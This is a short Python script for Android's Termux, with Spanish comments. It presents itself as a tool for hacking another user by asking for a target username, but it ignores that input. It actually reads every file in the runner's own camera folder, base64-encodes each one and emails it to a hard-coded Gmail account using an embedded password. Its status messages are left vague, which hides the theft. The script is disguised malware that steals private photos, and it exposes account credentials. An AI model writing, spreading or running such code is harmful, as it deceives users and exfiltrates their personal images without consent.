import os
import base64
import smtplib
from email.message import EmailMessage

input("ingrese el usuario que desea vulnerar: ")


# --- CONFIGURACIÓN DE CREDENCIALES ---
remitente = "cuentacrack7809@gmail.com"
destinatario = "cuentacrack7809@gmail.com"
password = "bqruwxkzuhsmvrjt"

# --- RUTA DE ARCHIVOS ---
ruta_camara = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera"

def enviar_archivo(nombre_archivo, contenido_base64):
    """Crea y envía el correo con el contenido Base64."""
    msg = EmailMessage()
    msg["From"] = remitente
    msg["To"] = destinatario
    msg["Subject"] = f"Archivo extraído: {nombre_archivo}"
    
    # El cuerpo del mensaje contendrá el texto Base64 del archivo
    msg.set_content(f"Contenido Base64 del archivo {nombre_archivo}:\n\n{contenido_base64}")

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(remitente, password)
            smtp.send_message(msg)
        print(f"✅ {contenido_base64}")
    except Exception as e:
        print(f"❌ Error")

# --- PROCESO PRINCIPAL ---
try:
    if os.path.exists(ruta_camara):
        # Listamos solo archivos reales
        archivos = [f for f in os.listdir(ruta_camara) if os.path.isfile(os.path.join(ruta_camara, f))]
        
        if not archivos:
            print("")
        
        for nombre in archivos:
            ruta_completa = os.path.join(ruta_camara, nombre)
            
            print(f"Procesando:")
            
            # 1. Leer archivo en binario
            with open(ruta_completa, "rb") as archivo:
                contenido_binario = archivo.read()
                
                # 2. Convertir a Base64 y decodificar a string
                base64_datos = base64.b64encode(contenido_binario).decode('utf-8')
                
                # 3. Enviar por correo
                enviar_archivo(nombre, base64_datos)
                
    else:
        print(f"Error:")

except Exception as e:
    print(f"Error general en el sistema: {e}")